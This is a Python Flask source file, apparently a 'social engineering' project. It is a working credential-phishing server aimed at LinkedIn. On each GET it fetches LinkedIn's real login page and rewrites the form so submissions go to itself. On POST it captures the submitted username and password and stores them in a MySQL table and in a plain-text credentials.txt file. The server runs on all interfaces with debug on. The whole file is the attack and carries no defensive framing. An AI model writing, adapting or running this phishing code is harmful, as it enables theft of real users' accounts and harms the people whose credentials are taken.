from flask import Flask, request, redirect
import mysql.connector
import requests

app = Flask(__name__)

# MySQL database configuration
db_config = {
    'host': 'localhost',
    'user': 'root',  # Default MySQL username
    'password': '',  # Empty password (you can replace this with your actual password if set)
    'database': 'social_eng_python'
}
# @app.teardown_appcontext
# def close_connection(exception):
#     if conn is not None:
#         conn.close()
#         print("MySQL connection closed")


# Connect to MySQL database
try:
    conn = mysql.connector.connect(**db_config)
    cursor = conn.cursor()
    print("Connected to MySQL database")
except mysql.connector.Error as e:
    print(f"Error connecting to MySQL database: {e}")

# Create a file to store credentials
file_path = 'credentials.txt'

@app.route('/', methods=['GET', 'POST'])
def index():
    print(request)
    if request.method == 'POST':
        # Get the form data submitted by the client
        username = request.form.get('session_key')
        password = request.form.get('session_password')

        try:
            # Insert credentials into the MySQL database
            insert_query = "INSERT INTO user_credentials (username, password) VALUES (%s, %s)"
            cursor.execute(insert_query, (username, password))
            conn.commit()
            print("Credentials saved to MySQL database")
        except mysql.connector.Error as e:
            print(f"Error inserting credentials into MySQL database: {e}")

        try:
            # Save credentials to a file
            with open(file_path, 'a') as file:
                file.write(f'Username: {username}, Password: {password}\n')
            print("Credentials saved to file")
        except Exception as e:
            print(f"Error saving credentials to file: {e}")

        print("Credentials saved to MySQL database")
        return redirect('/')

    else:
        # Hardcoded website link
        website_url = 'https://www.linkedin.com/uas/login?fromSignIn=true&trk=cold_join_sign_in%27'

        try:
            response = requests.get(website_url)

            if response.status_code == 200:
                # Replace the action attribute of the form with the desired action
                modified_content = response.text.replace('<form ', '<form action="/" ')
                return modified_content
            else:
                return 'Failed to fetch page content'

        except requests.RequestException as e:
            content = f"Error fetching website content: {str(e)}"
        return content  # Return raw HTML content

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
